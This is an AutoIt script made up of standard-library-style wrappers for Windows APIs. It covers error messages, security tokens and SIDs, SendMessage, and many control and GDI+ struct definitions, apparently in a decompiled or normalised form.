Global Enum $SIDTYPEUSER = 0x1, $SIDTYPEGROUP, $SIDTYPEDOMAIN, $SIDTYPEALIAS, $SIDTYPEWELLKNOWNGROUP, $SIDTYPEDELETEDACCOUNT, $SIDTYPEINVALID, $SIDTYPEUNKNOWN, $SIDTYPECOMPUTER, $SIDTYPELABEL
Global Const $SID_ADMINISTRATORS = "S-1-5-32-544"
Global Const $SID_USERS = "S-1-5-32-545"
Global Const $SID_GUESTS = "S-1-5-32-546"
Global Const $SID_ACCOUNT_OPERATORS = "S-1-5-32-548"
Global Const $SID_SERVER_OPERATORS = "S-1-5-32-549"
Global Const $SID_PRINT_OPERATORS = "S-1-5-32-550"
Global Const $SID_BACKUP_OPERATORS = "S-1-5-32-551"
Global Const $SID_REPLICATOR = "S-1-5-32-552"
Global Const $SID_OWNER = "S-1-3-0"
Global Const $SID_EVERYONE = "S-1-1-0"
Global Const $SID_NETWORK = "S-1-5-2"
Global Const $SID_INTERACTIVE = "S-1-5-4"
Global Const $SID_SYSTEM = "S-1-5-18"
Global Const $SID_AUTHENTICATED_USERS = "S-1-5-11"
Global Const $SID_SCHANNEL_AUTHENTICATION = "S-1-5-64-14"
Global Const $SID_DIGEST_AUTHENTICATION = "S-1-5-64-21"
Global Const $SID_NT_SERVICE = "S-1-5-80"
Global Const $SID_UNTRUSTED_MANDATORY_LEVEL = "S-1-16-0"
Global Const $SID_LOW_MANDATORY_LEVEL = "S-1-16-4096"
Global Const $SID_MEDIUM_MANDATORY_LEVEL = "S-1-16-8192"
Global Const $SID_MEDIUM_PLUS_MANDATORY_LEVEL = "S-1-16-8448"
Global Const $SID_HIGH_MANDATORY_LEVEL = "S-1-16-12288"
Global Const $SID_SYSTEM_MANDATORY_LEVEL = "S-1-16-16384"
Global Const $SID_PROTECTED_PROCESS_MANDATORY_LEVEL = "S-1-16-20480"
Global Const $SID_SECURE_PROCESS_MANDATORY_LEVEL = "S-1-16-28672"
Global Const $SID_ALL_SERVICES = "S-1-5-80-0"
#Region Global Variables and Constants
    Global Const $FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x100
    Global Const $FORMAT_MESSAGE_IGNORE_INSERTS = 0x200
    Global Const $FORMAT_MESSAGE_FROM_STRING = 0x400
    Global Const $FORMAT_MESSAGE_FROM_HMODULE = 0x800
    Global Const $FORMAT_MESSAGE_FROM_SYSTEM = 0x1000
    Global Const $FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x2000
#EndRegion Global Variables and Constants
Func _WinAPI_Beep($ifreq = 0x1f4, $iduration = 0x3e8)
    Local $acall = DllCall("kernel32.dll", "bool", "Beep", "dword", $ifreq, "dword", $iduration)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc    ; -> _WinAPI_Beep

Func _WinAPI_FormatMessage($iflags, $psource, $imessageid, $ilanguageid, ByRef $pbuffer, $isize, $varguments)
    Local $sbuffertype = "struct*"
    If IsString($pbuffer) Then $sbuffertype = "wstr"
    Local $acall = DllCall("kernel32.dll", "dword", "FormatMessageW", "dword", $iflags, "struct*", $psource, "dword", $imessageid, "dword", $ilanguageid, $sbuffertype, $pbuffer, "dword", $isize, "ptr", $varguments)
    If @error Then Return SetError(@error, @extended, 0x0)
    If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
    If $sbuffertype = "wstr" Then $pbuffer = $acall[0x5]
    Return $acall[0x0]
EndFunc    ; -> _WinAPI_FormatMessage

Func _WinAPI_GetErrorMessage($icode, $ilanguage = 0x0, Const $_ICALLERERROR = @error, Const $_ICALLEREXTENDED = @extended)
    Local $acall = DllCall("kernel32.dll", "dword", "FormatMessageW", "dword", BitOR($FORMAT_MESSAGE_FROM_SYSTEM, $FORMAT_MESSAGE_IGNORE_INSERTS), "ptr", 0x0, "dword", $icode, "dword", $ilanguage, "wstr", '', "dword", 0x1000, "ptr", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
    Return SetError($_ICALLERERROR, $_ICALLEREXTENDED, StringRegExpReplace($acall[0x5], "[" & @LF & "," & @CR & "]*\\Z", ''))
EndFunc    ; -> _WinAPI_GetErrorMessage

Func _WinAPI_GetLastError(Const $_ICALLERERROR = @error, Const $_ICALLEREXTENDED = @extended)
    Local $acall = DllCall("kernel32.dll", "dword", "GetLastError")
    Return SetError($_ICALLERERROR, $_ICALLEREXTENDED, $acall[0x0])
EndFunc    ; -> _WinAPI_GetLastError

Func _WinAPI_GetLastErrorMessage(Const $_ICALLERERROR = @error, Const $_ICALLEREXTENDED = @extended)
    Local $ilasterror = _WinAPI_GetLastError()
    Local $tbufferptr = DllStructCreate("ptr")
    Local $ncount = _WinAPI_FormatMessage(BitOR($FORMAT_MESSAGE_ALLOCATE_BUFFER, $FORMAT_MESSAGE_FROM_SYSTEM, $FORMAT_MESSAGE_IGNORE_INSERTS), 0x0, $ilasterror, 0x0, $tbufferptr, 0x0, 0x0)
    If @error Then Return SetError(- @error, @extended, '')
    Local $stext = ''
    Local $pbuffer = DllStructGetData($tbufferptr, 0x1)
    If $pbuffer Then
        If $ncount > 0x0 Then
            Local $tbuffer = DllStructCreate("wchar[" & ($ncount + 0x1) & "]", $pbuffer)
            $stext = DllStructGetData($tbuffer, 0x1)
            If StringRight($stext, 0x2) = @CRLF Then $stext = StringTrimRight($stext, 0x2)
        EndIf
        DllCall("kernel32.dll", "handle", "LocalFree", "handle", $pbuffer)
    EndIf
    Return SetError($_ICALLERERROR, $_ICALLEREXTENDED, $stext)
EndFunc    ; -> _WinAPI_GetLastErrorMessage

Func _WinAPI_MessageBeep($itype = 0x1)
    Local $isound
    Switch $itype
    Case 0x1
        $isound = 0x0
    Case 0x2
        $isound = 0x10
    Case 0x3
        $isound = 0x20
    Case 0x4
        $isound = 0x30
    Case 0x5
        $isound = 0x40
    Case Else
        $isound = + -1
    EndSwitch
    Local $acall = DllCall("user32.dll", "bool", "MessageBeep", "uint", $isound)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc    ; -> _WinAPI_MessageBeep

Func _WinAPI_MsgBox($iflags, $stitle, $stext)
    BlockInput(0x0)
    MsgBox($iflags, $stitle, $stext & "      ")
EndFunc    ; -> _WinAPI_MsgBox

Func _WinAPI_SetLastError($ierrorcode, Const $_ICALLERERROR = @error, Const $_ICALLEREXTENDED = @extended)
    DllCall("kernel32.dll", "none", "SetLastError", "dword", $ierrorcode)
    Return SetError($_ICALLERERROR, $_ICALLEREXTENDED, Null)
EndFunc    ; -> _WinAPI_SetLastError

Func _WinAPI_ShowError($stext, $bexit = True)
    BlockInput(0x0)
    MsgBox($MB_SYSTEMMODAL, "Error", $stext & "      ")
    If $bexit Then Exit
EndFunc    ; -> _WinAPI_ShowError

Func _WinAPI_ShowLastError($stext = '', $babort = False, $ilanguage = 0x0, Const $_ICALLERERROR = @error, Const $_ICALLEREXTENDED = @extended)
    Local $serror
    Local $ilasterror = _WinAPI_GetLastError()
    While 0x1
        $serror = _WinAPI_GetErrorMessage($ilasterror, $ilanguage)
        If @error And $ilanguage Then
            $ilanguage = 0x0
        Else
            ExitLoop
        EndIf
    WEnd
    If StringStripWS($stext, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then
        $stext &= @CRLF & @CRLF
    Else
        $stext = ''
    EndIf
    _WinAPI_MsgBox(BitOR(0x40000, BitShift(0x10, + -2 * (Not $ilasterror))), $ilasterror, $stext & $serror)
    If $ilasterror Then
        _WinAPI_SetLastError($ilasterror)
        If $babort Then
            Exit $ilasterror
        EndIf
    EndIf
    Return SetError($_ICALLERERROR, $_ICALLEREXTENDED, 0x1)
EndFunc    ; -> _WinAPI_ShowLastError

Func _WinAPI_ShowMsg($stext)
    _WinAPI_MsgBox($MB_SYSTEMMODAL, "Information", $stext)
EndFunc    ; -> _WinAPI_ShowMsg

Func __COMErrorFormating(ByRef $ocomerror, $sprefix = @TAB)
    Local Const $STR_STRIPTRAILING = 0x2
    Local $serror = "COM Error encountered in " & @ScriptName & " (" & $ocomerror.Scriptline & ") :" & @CRLF & $sprefix & "Number        " & @TAB & "= 0x" & Hex($ocomerror.Number, 0x8) & " (" & $ocomerror.Number & ")" & @CRLF & $sprefix & "WinDescription" & @TAB & "= " & StringStripWS($ocomerror.WinDescription, $STR_STRIPTRAILING) & @CRLF & $sprefix & "Description   " & @TAB & "= " & StringStripWS($ocomerror.Description, $STR_STRIPTRAILING) & @CRLF & $sprefix & "Source        " & @TAB & "= " & $ocomerror.Source & @CRLF & $sprefix & "HelpFile      " & @TAB & "= " & $ocomerror.HelpFile & @CRLF & $sprefix & "HelpContext   " & @TAB & "= " & $ocomerror.HelpContext & @CRLF & $sprefix & "LastDllError  " & @TAB & "= " & $ocomerror.LastDllError & @CRLF & $sprefix & "Retcode       " & @TAB & "= 0x" & Hex($ocomerror.retcode)
    Return $serror
EndFunc    ; -> __COMErrorFormating

#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _Security__AdjustTokenPrivileges($htoken, $bdisableall, $tnewstate, $ibufferlen, $tprevstate = 0x0, $prequired = 0x0)
        Local $acall = DllCall("advapi32.dll", "bool", "AdjustTokenPrivileges", "handle", $htoken, "bool", $bdisableall, "struct*", $tnewstate, "dword", $ibufferlen, "struct*", $tprevstate, "struct*", $prequired)
        If @error Then Return SetError(@error, @extended, False)
        Return Not ($acall[0x0] = 0x0)
    EndFunc    ; -> _Security__AdjustTokenPrivileges

    Func _Security__CreateProcessWithToken($htoken, $ilogonflags, $scommandline, $icreationflags, $scurdir, $tstartupinfo, $tprocess_information)
        Local $acall = DllCall("advapi32.dll", "bool", "CreateProcessWithTokenW", "handle", $htoken, "dword", $ilogonflags, "ptr", 0x0, "wstr", $scommandline, "dword", $icreationflags, "struct*", 0x0, "wstr", $scurdir, "struct*", $tstartupinfo, "struct*", $tprocess_information)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, False)
        Return True
    EndFunc    ; -> _Security__CreateProcessWithToken

    Func _Security__DuplicateTokenEx($hexistingtoken, $idesiredaccess, $iimpersonationlevel, $itokentype)
        Local $acall = DllCall("advapi32.dll", "bool", "DuplicateTokenEx", "handle", $hexistingtoken, "dword", $idesiredaccess, "struct*", 0x0, "int", $iimpersonationlevel, "int", $itokentype, "handle*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x6]
    EndFunc    ; -> _Security__DuplicateTokenEx

    Func _Security__GetAccountSid($saccount, $ssystem = '')
        Local $aacct = _Security__LookupAccountName($saccount, $ssystem)
        If @error Then Return SetError(@error, @extended, 0x0)
        If IsArray($aacct) Then Return _Security__StringSidToSid($aacct[0x0])
        Return ''
    EndFunc    ; -> _Security__GetAccountSid

    Func _Security__GetLengthSid($psid)
        If Not _Security__IsValidSid($psid) Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $acall = DllCall("advapi32.dll", "dword", "GetLengthSid", "struct*", $psid)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _Security__GetLengthSid

    Func _Security__GetTokenInformation($htoken, $iclass)
        Local $acall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "int", $iclass, "struct*", 0x0, "dword", 0x0, "dword*", 0x0)
        If @error Or Not $acall[0x5] Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $ilen = $acall[0x5]
        Local $tbuffer = DllStructCreate("byte[" & $ilen & "]")
        $acall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "int", $iclass, "struct*", $tbuffer, "dword", DllStructGetSize($tbuffer), "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tbuffer
    EndFunc    ; -> _Security__GetTokenInformation

    Func _Security__ImpersonateSelf($ilevel = $SECURITYIMPERSONATION)
        Local $acall = DllCall("advapi32.dll", "bool", "ImpersonateSelf", "int", $ilevel)
        If @error Then Return SetError(@error, @extended, False)
        Return Not ($acall[0x0] = 0x0)
    EndFunc    ; -> _Security__ImpersonateSelf

    Func _Security__IsValidSid($psid)
        Local $acall = DllCall("advapi32.dll", "bool", "IsValidSid", "struct*", $psid)
        If @error Then Return SetError(@error, @extended, False)
        Return Not ($acall[0x0] = 0x0)
    EndFunc    ; -> _Security__IsValidSid

    Func _Security__LookupAccountName($saccount, $ssystem = '')
        Local $tdata = DllStructCreate("byte SID[256]")
        Local $acall = DllCall("advapi32.dll", "bool", "LookupAccountNameW", "wstr", $ssystem, "wstr", $saccount, "struct*", $tdata, "dword*", DllStructGetSize($tdata), "wstr", '', "dword*", DllStructGetSize($tdata), "int*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aacct[0x3]
        $aacct[0x0] = _Security__SidToStringSid(DllStructGetPtr($tdata, "SID"))
        $aacct[0x1] = $acall[0x5]
        $aacct[0x2] = $acall[0x7]
        Return $aacct
    EndFunc    ; -> _Security__LookupAccountName

    Func _Security__LookupAccountSid($vsid, $ssystem = '')
        Local $psid, $aacct[0x3]
        If IsString($vsid) Then
            $psid = _Security__StringSidToSid($vsid)
        Else
            $psid = $vsid
        EndIf
        If Not _Security__IsValidSid($psid) Then Return SetError(@error + 0x14, @extended, 0x0)
        If $ssystem = '' Then $ssystem = Null
        Local $acall = DllCall("advapi32.dll", "bool", "LookupAccountSidW", "wstr", $ssystem, "struct*", $psid, "wstr", '', "dword*", 0x10000, "wstr", '', "dword*", 0x10000, "int*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aacct[0x3]
        $aacct[0x0] = $acall[0x3]
        $aacct[0x1] = $acall[0x5]
        $aacct[0x2] = $acall[0x7]
        Return $aacct
    EndFunc    ; -> _Security__LookupAccountSid

    Func _Security__LookupPrivilegeValue($ssystem, $sname)
        Local $acall = DllCall("advapi32.dll", "bool", "LookupPrivilegeValueW", "wstr", $ssystem, "wstr", $sname, "int64*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x3]
    EndFunc    ; -> _Security__LookupPrivilegeValue

    Func _Security__OpenProcessToken($hprocess, $iaccess)
        Local $acall = DllCall("advapi32.dll", "bool", "OpenProcessToken", "handle", $hprocess, "dword", $iaccess, "handle*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x3]
    EndFunc    ; -> _Security__OpenProcessToken

    Func _Security__OpenThreadToken($iaccess, $hthread = 0x0, $bopenasself = False)
        Local $acall
        If $hthread = 0x0 Then
            $acall = DllCall("kernel32.dll", "handle", "GetCurrentThread")
            If @error Then Return SetError(@error + 0x14, @extended, 0x0)
            $hthread = $acall[0x0]
        EndIf
        $acall = DllCall("advapi32.dll", "bool", "OpenThreadToken", "handle", $hthread, "dword", $iaccess, "bool", $bopenasself, "handle*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x4]
    EndFunc    ; -> _Security__OpenThreadToken

    Func _Security__OpenThreadTokenEx($iaccess, $hthread = 0x0, $bopenasself = False)
        Local $htoken = _Security__OpenThreadToken($iaccess, $hthread, $bopenasself)
        If $htoken = 0x0 Then
            Local Const $ERROR_NO_TOKEN = 0x3f0
            If _WinAPI_GetLastError() <> $ERROR_NO_TOKEN Then Return SetError(0x14, _WinAPI_GetLastError(), 0x0)
            If Not _Security__ImpersonateSelf() Then Return SetError(@error + 0xa, _WinAPI_GetLastError(), 0x0)
            $htoken = _Security__OpenThreadToken($iaccess, $hthread, $bopenasself)
            If $htoken = 0x0 Then Return SetError(@error, _WinAPI_GetLastError(), 0x0)
        EndIf
        Return $htoken
    EndFunc    ; -> _Security__OpenThreadTokenEx

    Func _Security__SetPrivilege($htoken, $sprivilege, $benable)
        Local $iluid = _Security__LookupPrivilegeValue('', $sprivilege)
        If $iluid = 0x0 Then Return SetError(@error + 0xa, @extended, False)
        Local Const $TAGTOKEN_PRIVILEGES = "dword Count;align 4;int64 LUID;dword Attributes"
        Local $tcurrstate = DllStructCreate($TAGTOKEN_PRIVILEGES)
        Local $icurrstate = DllStructGetSize($tcurrstate)
        Local $tprevstate = DllStructCreate($TAGTOKEN_PRIVILEGES)
        Local $iprevstate = DllStructGetSize($tprevstate)
        Local $trequired = DllStructCreate("int Data")
        DllStructSetData($tcurrstate, "Count", 0x1)
        DllStructSetData($tcurrstate, "LUID", $iluid)
        If Not _Security__AdjustTokenPrivileges($htoken, False, $tcurrstate, $icurrstate, $tprevstate, $trequired) Then Return SetError(0x2, @error, False)
        DllStructSetData($tprevstate, "Count", 0x1)
        DllStructSetData($tprevstate, "LUID", $iluid)
        Local $iattributes = DllStructGetData($tprevstate, "Attributes")
        If $benable Then
            $iattributes = BitOR($iattributes, $SE_PRIVILEGE_ENABLED)
        Else
            $iattributes = BitAND($iattributes, BitNOT($SE_PRIVILEGE_ENABLED))
        EndIf
        DllStructSetData($tprevstate, "Attributes", $iattributes)
        If Not _Security__AdjustTokenPrivileges($htoken, False, $tprevstate, $iprevstate, $tcurrstate, $trequired) Then Return SetError(0x3, @error, False)
        Return True
    EndFunc    ; -> _Security__SetPrivilege

    Func _Security__SetTokenInformation($htoken, $itokeninformation, $vtokeninformation, $itokeninformationlength)
        Local $acall = DllCall("advapi32.dll", "bool", "SetTokenInformation", "handle", $htoken, "int", $itokeninformation, "struct*", $vtokeninformation, "dword", $itokeninformationlength)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, False)
        Return True
    EndFunc    ; -> _Security__SetTokenInformation

    Func _Security__SidToStringSid($psid)
        If Not _Security__IsValidSid($psid) Then Return SetError(@error + 0xa, 0x0, '')
        Local $acall = DllCall("advapi32.dll", "bool", "ConvertSidToStringSidW", "struct*", $psid, "ptr*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Local $pstringsid = $acall[0x2]
        Local $alen = DllCall("kernel32.dll", "int", "lstrlenW", "struct*", $pstringsid)
        Local $ssid = DllStructGetData(DllStructCreate("wchar Text[" & $alen[0x0] + 0x1 & "]", $pstringsid), "Text")
        DllCall("kernel32.dll", "handle", "LocalFree", "handle", $pstringsid)
        Return $ssid
    EndFunc    ; -> _Security__SidToStringSid

    Func _Security__SidTypeStr($itype)
        Switch $itype
        Case $SIDTYPEUSER
            Return "User"
        Case $SIDTYPEGROUP
            Return "Group"
        Case $SIDTYPEDOMAIN
            Return "Domain"
        Case $SIDTYPEALIAS
            Return "Alias"
        Case $SIDTYPEWELLKNOWNGROUP
            Return "Well Known Group"
        Case $SIDTYPEDELETEDACCOUNT
            Return "Deleted Account"
        Case $SIDTYPEINVALID
            Return "Invalid"
        Case $SIDTYPEUNKNOWN
            Return "Unknown Type"
        Case $SIDTYPECOMPUTER
            Return "Computer"
        Case $SIDTYPELABEL
            Return "A mandatory integrity label SID"
        Case Else
            Return "Unknown SID Type"
        EndSwitch
    EndFunc    ; -> _Security__SidTypeStr

    Func _Security__StringSidToSid($ssid)
        Local $acall = DllCall("advapi32.dll", "bool", "ConvertStringSidToSidW", "wstr", $ssid, "ptr*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $psid = $acall[0x2]
        Local $tbuffer = DllStructCreate("byte Data[" & _Security__GetLengthSid($psid) & "]", $psid)
        Local $tsid = DllStructCreate("byte Data[" & DllStructGetSize($tbuffer) & "]")
        DllStructSetData($tsid, "Data", DllStructGetData($tbuffer, "Data"))
        DllCall("kernel32.dll", "handle", "LocalFree", "handle", $psid)
        Return $tsid
    EndFunc    ; -> _Security__StringSidToSid

#EndRegion Public Functions
Func _SendMessage($hwnd, $imsg, $wparam = 0x0, $lparam = 0x0, $ireturn = 0x0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
    Local $acall = DllCall("user32.dll", $sreturntype, "SendMessageW", "hwnd", $hwnd, "uint", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
    If @error Then Return SetError(@error, @extended, '')
    If $ireturn >= 0x0 And $ireturn <= 0x4 Then Return $acall[$ireturn]
    Return $acall
EndFunc    ; -> _SendMessage

Func _SendMessageA($hwnd, $imsg, $wparam = 0x0, $lparam = 0x0, $ireturn = 0x0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
    Local $acall = DllCall("user32.dll", $sreturntype, "SendMessageA", "hwnd", $hwnd, "uint", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
    If @error Then Return SetError(@error, @extended, '')
    If $ireturn >= 0x0 And $ireturn <= 0x4 Then Return $acall[$ireturn]
    Return $acall
EndFunc    ; -> _SendMessageA

Global Const $TAGPOINT = "struct;long X;long Y;endstruct"
Global Const $TAGRECT = "struct;long Left;long Top;long Right;long Bottom;endstruct"
Global Const $TAGSIZE = "struct;long X;long Y;endstruct"
Global Const $TAGMARGINS = "int cxLeftWidth;int cxRightWidth;int cyTopHeight;int cyBottomHeight"
Global Const $TAGFILETIME = "struct;dword Lo;dword Hi;endstruct"
Global Const $TAGSYSTEMTIME = "struct;word Year;word Month;word Dow;word Day;word Hour;word Minute;word Second;word MSeconds;endstruct"
Global Const $TAGTIME_ZONE_INFORMATION = "struct;long Bias;wchar StdName[32];word StdDate[8];long StdBias;wchar DayName[32];word DayDate[8];long DayBias;endstruct"
Global Const $TAGNMHDR = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
Global Const $TAGCOMBOBOXEXITEM = "uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;int SelectedImage;int OverlayImage;" & "int Indent;lparam Param"
Global Const $TAGNMCBEDRAGBEGIN = $TAGNMHDR & ";int ItemID;wchar szText[260]"
Global Const $TAGNMCBEENDEDIT = $TAGNMHDR & ";bool fChanged;int NewSelection;wchar szText[260];int Why"
Global Const $TAGNMCOMBOBOXEX = $TAGNMHDR & ";uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;" & "int SelectedImage;int OverlayImage;int Indent;lparam Param"
Global Const $TAGDTPRANGE = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;" & "word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;" & "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
Global Const $TAGNMDATETIMECHANGE = $TAGNMHDR & ";dword Flag;" & $TAGSYSTEMTIME
Global Const $TAGNMDATETIMEFORMAT = $TAGNMHDR & ";ptr Format;" & $TAGSYSTEMTIME & ";ptr pDisplay;wchar Display[64]"
Global Const $TAGNMDATETIMEFORMATQUERY = $TAGNMHDR & ";ptr Format;struct;long SizeX;long SizeY;endstruct"
Global Const $TAGNMDATETIMEKEYDOWN = $TAGNMHDR & ";int VirtKey;ptr Format;" & $TAGSYSTEMTIME
Global Const $TAGNMDATETIMESTRING = $TAGNMHDR & ";ptr UserString;" & $TAGSYSTEMTIME & ";dword Flags"
Global Const $TAGEVENTLOGRECORD = "dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;" & "word EventType;word NumStrings;word EventCategory;word ReservedFlags;dword ClosingRecordNumber;dword StringOffset;" & "dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset"
Global Const $TAGGDIP_EFFECTPARAMS_BLUR = "float Radius; bool ExpandEdge"
Global Const $TAGGDIP_EFFECTPARAMS_BRIGHTNESSCONTRAST = "int BrightnessLevel; int ContrastLevel"
Global Const $TAGGDIP_EFFECTPARAMS_COLORBALANCE = "int CyanRed; int MagentaGreen; int YellowBlue"
Global Const $TAGGDIP_EFFECTPARAMS_COLORCURVE = "int Adjustment; int Channel; int AdjustValue"
Global Const $TAGGDIP_EFFECTPARAMS_COLORLUT = "byte LutB[256]; byte LutG[256]; byte LutR[256]; byte LutA[256]"
Global Const $TAGGDIP_EFFECTPARAMS_HUESATURATIONLIGHTNESS = "int HueLevel; int SaturationLevel; int LightnessLevel"
Global Const $TAGGDIP_EFFECTPARAMS_LEVELS = "int Highlight; int Midtone; int Shadow"
Global Const $TAGGDIP_EFFECTPARAMS_REDEYECORRECTION = "uint NumberOfAreas; ptr Areas"
Global Const $TAGGDIP_EFFECTPARAMS_SHARPEN = "float Radius; float Amount"
Global Const $TAGGDIP_EFFECTPARAMS_TINT = "int Hue; int Amount"
Global Const $TAGGDIPBITMAPDATA = "uint Width;uint Height;int Stride;int Format;ptr Scan0;uint_ptr Reserved"
Global Const $TAGGDIPCOLORMATRIX = "float m[25]"
Global Const $TAGGDIPENCODERPARAM = "struct;byte GUID[16];ulong NumberOfValues;ulong Type;ptr Values;endstruct"
Global Const $TAGGDIPENCODERPARAMS = "uint Count;" & $TAGGDIPENCODERPARAM
Global Const $TAGGDIPRECTF = "struct;float X;float Y;float Width;float Height;endstruct"
Global Const $TAGGDIPSTARTUPINPUT = "uint Version;ptr Callback;bool NoThread;bool NoCodecs"
Global Const $TAGGDIPSTARTUPOUTPUT = "ptr HookProc;ptr UnhookProc"
Global Const $TAGGDIPIMAGECODECINFO = "byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
Global Const $TAGGDIPPENCODERPARAMS = "uint Count;byte Params[1]"
Global Const $TAGHDITEM = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
Global Const $TAGNMHDDISPINFO = $TAGNMHDR & ";int Item;uint Mask;ptr Text;int TextMax;int Image;lparam lParam"
Global Const $TAGNMHDFILTERBTNCLICK = $TAGNMHDR & ";int Item;" & $TAGRECT
Global Const $TAGNMHEADER = $TAGNMHDR & ";int Item;int Button;ptr pItem"
Global Const $TAGGETIPADDRESS = "byte Field4;byte Field3;byte Field2;byte Field1"
Global Const $TAGNMIPADDRESS = $TAGNMHDR & ";int Field;int Value"
Global Const $TAGLVFINDINFO = "struct;uint Flags;ptr Text;lparam Param;" & $TAGPOINT & ";uint Direction;endstruct"
Global Const $TAGLVHITTESTINFO = $TAGPOINT & ";uint Flags;int Item;int SubItem;int iGroup"
Global Const $TAGLVITEM = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
Global Const $TAGNMLISTVIEW = $TAGNMHDR & ";int Item;int SubItem;uint NewState;uint OldState;uint Changed;" & "struct;long ActionX;long ActionY;endstruct;lparam Param"
Global Const $TAGNMLVCUSTOMDRAW = "struct;" & $TAGNMHDR & ";dword dwDrawStage;handle hdc;" & $TAGRECT & ";dword_ptr dwItemSpec;uint uItemState;lparam lItemlParam;endstruct" & ";dword clrText;dword clrTextBk;int iSubItem;dword dwItemType;dword clrFace;int iIconEffect;" & "int iIconPhase;int iPartID;int iStateID;struct;long TextLeft;long TextTop;long TextRight;long TextBottom;endstruct;uint uAlign"
Global Const $TAGNMLVDISPINFO = $TAGNMHDR & ";" & $TAGLVITEM
Global Const $TAGNMLVFINDITEM = $TAGNMHDR & ";int Start;" & $TAGLVFINDINFO
Global Const $TAGNMLVGETINFOTIP = $TAGNMHDR & ";dword Flags;ptr Text;int TextMax;int Item;int SubItem;lparam lParam"
Global Const $TAGNMITEMACTIVATE = $TAGNMHDR & ";int Index;int SubItem;uint NewState;uint OldState;uint Changed;" & $TAGPOINT & ";lparam lParam;uint KeyFlags"
Global Const $TAGNMLVKEYDOWN = $TAGNMHDR & ";align 2;word VKey;uint Flags"
Global Const $TAGNMLVSCROLL = $TAGNMHDR & ";int DX;int DY"
Global Const $TAGMCHITTESTINFO = "uint Size;" & $TAGPOINT & ";uint Hit;" & $TAGSYSTEMTIME & ";" & $TAGRECT & ";int iOffset;int iRow;int iCol"
Global Const $TAGMCMONTHRANGE = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short Span"
Global Const $TAGMCRANGE = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short MinSet;short MaxSet"
Global Const $TAGMCSELRANGE = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds"
Global Const $TAGNMDAYSTATE = $TAGNMHDR & ";" & $TAGSYSTEMTIME & ";int DayState;ptr pDayState"
Global Const $TAGNMSELCHANGE = $TAGNMHDR & ";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;word BegMinute;word BegSecond;word BegMSeconds;endstruct;" & "struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinute;word EndSecond;word EndMSeconds;endstruct"
Global Const $TAGNMOBJECTNOTIFY = $TAGNMHDR & ";int Item;ptr piid;ptr pObject;long Result;dword dwFlags"
Global Const $TAGNMTCKEYDOWN = $TAGNMHDR & ";align 2;word VKey;uint Flags"
